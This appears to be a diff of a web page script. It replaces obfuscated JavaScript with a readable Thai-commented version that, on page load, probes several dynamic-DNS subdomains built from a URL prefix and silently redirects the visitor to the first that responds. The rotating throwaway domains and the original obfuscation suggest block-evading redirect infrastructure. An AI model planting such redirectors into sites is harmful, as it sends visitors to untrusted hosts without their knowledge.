@@ -1,1 +1,48 @@
-const _0x425a54=_0x4313;function _0x5697(){const _0x11ef8f=['show','href','18778194VMkNWz','/api','.read-books.org','status','1175968qjcJwc','.sen.zapto.org','modal-1','https://','length','GET','location','No\x20API\x20responded\x20with\x20200\x20OK:','VSxgP','any','LMrDb','1896524CwAphr','247526QETWFG','RstRu','pxuSL','Non-200\x20response\x20from\x20','5873955mRUlEK','72fDNEwX','915733IdfDXg','.sen.hopto.me','6784818jytaXg','12kytaVy','map','log','split','Modal','error'];_0x5697=function(){return _0x11ef8f;};return _0x5697();}(function(_0x53f395,_0x5ea6fa){const _0x1ab5cd=_0x4313,_0x2ecf3a=_0x53f395();while(!![]){try{const _0x47f7d8=parseInt(_0x1ab5cd(0xe8))/(0x40e+0x8b3+-0xcc0)+-parseInt(_0x1ab5cd(0xf4))/(0x1*-0x20b8+-0x9bf+-0x53*-0x83)*(-parseInt(_0x1ab5cd(0xfd))/(-0x6f1*0x1+0x236*-0x10+0x2a54))+parseInt(_0x1ab5cd(0xf3))/(0xb3f+0x2*-0x971+-0x1*-0x7a7)+-parseInt(_0x1ab5cd(0xf8))/(0x1*-0x2185+0x2003+0x11*0x17)+-parseInt(_0x1ab5cd(0xfc))/(-0x41*-0x25+0x1*-0xb3d+0x2*0xef)+parseInt(_0x1ab5cd(0xfa))/(-0x8f5+0x267*0x4+-0xa0)*(-parseInt(_0x1ab5cd(0xf9))/(0x8dd*-0x1+0x5ea+0x2fb))+parseInt(_0x1ab5cd(0xe4))/(-0x503+-0xb*-0x29c+-0x17a8);if(_0x47f7d8===_0x5ea6fa)break;else _0x2ecf3a['push'](_0x2ecf3a['shift']());}catch(_0x52999c){_0x2ecf3a['push'](_0x2ecf3a['shift']());}}}(_0x5697,-0x3*0x3ac7b+-0x4*0xb9c0+0x1ff7*0xcb));let prefix=window[_0x425a54(0xee)][_0x425a54(0x104)][_0x425a54(0x100)]('?')[_0x425a54(0xec)]==0x815+-0x1*-0x2329+-0x2*0x159e?window['location']['href'][_0x425a54(0x100)]('?')[0x1eb*0xf+0x6*-0x657+0x2*0x4a3]:'';prefix['split']('&')[_0x425a54(0xec)]>0x5a2+0x995*0x4+0xea7*-0x3&&(prefix=prefix[_0x425a54(0x100)]('&')[-0x1*0xfa1+0x1d65+-0xdc4]);console[_0x425a54(0xff)]('prefix:',prefix);async function checkApisAndRedirect(){const _0x5e69d1=_0x425a54,_0x130be7={'LMrDb':function(_0x28d559,_0x322839){return _0x28d559===_0x322839;},'VSxgP':_0x5e69d1(0xe5),'pxuSL':_0x5e69d1(0xef),'RstRu':function(_0x1b5ed1){return _0x1b5ed1();}},_0x4f4fb1=[_0x5e69d1(0xeb)+prefix+'.la.myeffect.net','https://'+prefix+'.laos.nhlfan.net',_0x5e69d1(0xeb)+prefix+_0x5e69d1(0xfb),_0x5e69d1(0xeb)+prefix+_0x5e69d1(0xe9),_0x5e69d1(0xeb)+prefix+'.vt.servep2p.com',_0x5e69d1(0xeb)+prefix+_0x5e69d1(0xe6)],_0x406f66={};_0x406f66['method']=_0x5e69d1(0xed);const _0x130181=_0x4f4fb1[_0x5e69d1(0xfe)](_0x717d04=>fetch(_0x717d04,_0x406f66)['then'](_0x52b31c=>{const _0x453fa1=_0x5e69d1;if(_0x130be7[_0x453fa1(0xf2)](_0x52b31c[_0x453fa1(0xe7)],-0x162a+0x175*0xe+0x28c))return _0x717d04['replace'](_0x130be7[_0x453fa1(0xf0)],'/');else throw new Error(_0x453fa1(0xf7)+_0x717d04);}));try{const _0x58e778=await Promise[_0x5e69d1(0xf1)](_0x130181);window['location'][_0x5e69d1(0x104)]=_0x58e778;}catch(_0x499283){console[_0x5e69d1(0x102)](_0x130be7[_0x5e69d1(0xf6)],_0x499283),_0x130be7[_0x5e69d1(0xf5)](openModal);}}checkApisAndRedirect();function _0x4313(_0x270711,_0x54f267){const _0x1f6087=_0x5697();return _0x4313=function(_0x4ac533,_0x4652a1){_0x4ac533=_0x4ac533-(0x1a*0x67+0x6f2*0x1+-0x1c*0x97);let _0xc3938e=_0x1f6087[_0x4ac533];return _0xc3938e;},_0x4313(_0x270711,_0x54f267);}function openModal(){const _0x55b452=_0x425a54;var _0x252d20=new bootstrap[(_0x55b452(0x101))](document['getElementById'](_0x55b452(0xea)));_0x252d20[_0x55b452(0x103)]();}
+let prefix = window.location.href.split('?').length == 2 ? window.location.href.split('?')[1] : '';
+if (prefix.split('&').length > 1) {
+  // ถ้าไม่มี prefix ใน URL ให้ใช้ค่าเริ่มต้น
+  prefix = prefix.split('&')[0];
+}
+console.log("prefix:", prefix)
+async function checkApisAndRedirect() {
+  const apiEndpoints = [
+    `https://${prefix}.la.myeffect.net`,
+    `https://${prefix}.laos.nhlfan.net`,
+    `https://${prefix}.sen.hopto.me`,
+    `https://${prefix}.sen.zapto.org`,
+    `https://${prefix}.vt.servep2p.com`,
+    `https://${prefix}.read-books.org`,
+    `https://${prefix}.duckgo.ddns.net`,
+    `https://${prefix}.serv.ddns.me`,
+  ];
+
+  // สร้าง Promise สำหรับแต่ละ API
+  const checks = apiEndpoints.map(apiUrl =>
+    fetch(apiUrl, { method: 'GET' })
+      .then(response => {
+        if (response.status === 200) {
+          // ถ้าตอบกลับ 200 OK -> คืน domain สำหรับ redirect
+          return apiUrl.replace('/api', '/');
+        } else {
+          throw new Error(`Non-200 response from ${apiUrl}`);
+        }
+      })
+  );
+
+  try {
+    // รอให้หนึ่งใน API ตอบกลับสำเร็จ
+    const targetDomain = await Promise.any(checks);
+    window.location.href = targetDomain;
+  } catch (error) {
+    console.error("No API responded with 200 OK:", error);
+    openModal();
+  }
+}
+
+// เรียกใช้ฟังก์ชันตอนโหลดหน้า
+checkApisAndRedirect();
+
+  function openModal() {
+    var myModal = new bootstrap.Modal(document.getElementById('modal-1'));
+    myModal.show();
+  }
